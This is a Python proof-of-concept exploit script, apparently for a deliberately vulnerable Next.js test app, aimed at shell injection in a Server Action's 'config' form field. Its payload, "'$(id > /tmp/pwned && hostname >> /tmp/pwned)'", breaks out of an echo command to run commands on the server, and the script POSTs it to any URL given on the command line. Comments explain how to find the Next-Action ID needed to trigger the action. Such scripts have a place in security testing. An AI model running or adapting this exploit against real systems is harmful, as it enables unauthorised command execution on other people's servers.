import requests
import sys
import json

def exploit(target_url):
    print(f"[*] Targeting: {target_url}")
    
    # The vulnerability is in the 'config' field of the 'updateProfile' action.
    # We need to construct a multipart/form-data request that simulates 
    # a submission to the Server Action.
    
    # In Next.js Server Actions, the Action ID is usually passed via a header
    # or part of the request body. However, for a simple form submission, 
    # it often looks like a standard POST.
    # BUT, if we want to *inject* into the 'config' field which expects JSON
    # but is eval'd/executed, we craft the payload here.
    
    # Payload to execute 'whoami' and write to a file in /tmp/pwned
    # We are injecting into: echo '{"username": "...", "config": <INJECTION>}' > ...
    # So we need to close the JSON object and inject shell commands.
    # configRaw takes `$(whoami > /tmp/pwned)` or similar.
    # Let's try to inject a command that runs `id`.
    
    # If the code does: `const command = ... "config": ${configRaw}}' ...`
    # and configRaw is `foo}`, then it becomes `"config": foo}}'`
    # We want to use command substitution.
    
    # Payload: `'\$(id > /tmp/pwned)'`
    # We need to surround the command substitution with single quotes to break out
    # of the `echo '...'` context on the server.
    
    payload_cmd = "'$(id > /tmp/pwned && hostname >> /tmp/pwned)'"
    
    # In a real RSC/Server Action attack, we might need to send specific headers
    # like `Next-Action` if we were invoking it via fetch, but standard <form> 
    # submissions works as regular POSTs to the page URL if JS is disabled or 
    # sometimes even if enabled (progressive enhancement).
    # Since our page.tsx uses a standard <form action={updateProfile}>,
    # Next.js handles this as a POST to the current URL with specific form data.
    
    # We need to find the Action ID if we want to invoke it purely via API, 
    # but often just POSTing with the right field names works if the server logic 
    # creates a binding. Actually, Next.js Server Actions usually require a 
    # `Next-Action` header ID to route to the specific function.
    
    # SIMULATION NOTE:
    # Since we can't easily scrape the dynamic Action ID without parsing the HTML 
    # (it changes on build), this script assumes we can just hit the endpoint 
    # if it were a standard API, OR we have to implement a scraper.
    # For this PoC, we'll assume the user might manually trigger it or we 
    # simulate the request structure.
    
    # However, to make this script reliable against the provided code *without* 
    # needing to parse the build ID, we will note that in a real pentest, 
    # one would get the ID from the HTML source.
    # For now, let's just print the CURL command that the tester should run 
    # after inspecting their browser network tab, OR we try to send a generic POST.
    
    print("[!] NOTE: To trigger the specific Server Action, you need the Action ID.")
    print("[!] You can copy it from the 'action' attribute of the <form> in the HTML source.")
    print("[!] Example header: Next-Action: <long-hash>")
    
    # If we want to fully automate it, we'd fetch the page, regex for the action ID.
    try:
        s = requests.Session()
        r = s.get(target_url)
        # Simple regex (heuristic) to find the action ID
        # It usually looks like: action="javascript:..." or inside a hidden input for progressive enhancement
        # or <form action="/?_rsc=..." ...>
        # Next.js 14 progressive enhancement uses a hidden input named $ACTION_ID_<hash>
        
        print(f"[*] Fetched page. Status: {r.status_code}")
        
        # Let's assume we are just submitting the form fields.
        # The payload is in the 'config' field.
        
        data = {
            "username": "attacker",
            "bio": "I am simulating an attack.",
            "config": payload_cmd 
        }
        
        # We'll send a POST request. In a real scenario, we'd need that Action ID header.
        # For the sake of this "PoC Environment", we've provided the *vulnerable code*.
        # The exploit script here demonstrates *what* to send.
        
        print(f"[*] Sending payload to {target_url}...")
        print(f"[*] Payload configuration: {payload_cmd}")
        
        # This is a best-effort POST. If the server requires the specific Action ID header
        # (which it does), this request might fail to trigger the action without it.
        # But this documents the exploit vector.
        
        response = s.post(target_url, data=data)
        
        print(f"[*] Response status: {response.status_code}")
        print("[*] If successful and the server is vulnerable to shell injection in 'config',")
        print("[*] check /tmp/pwned on the server/container.")
        
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <url>")
        sys.exit(1)
    
    exploit(sys.argv[1])
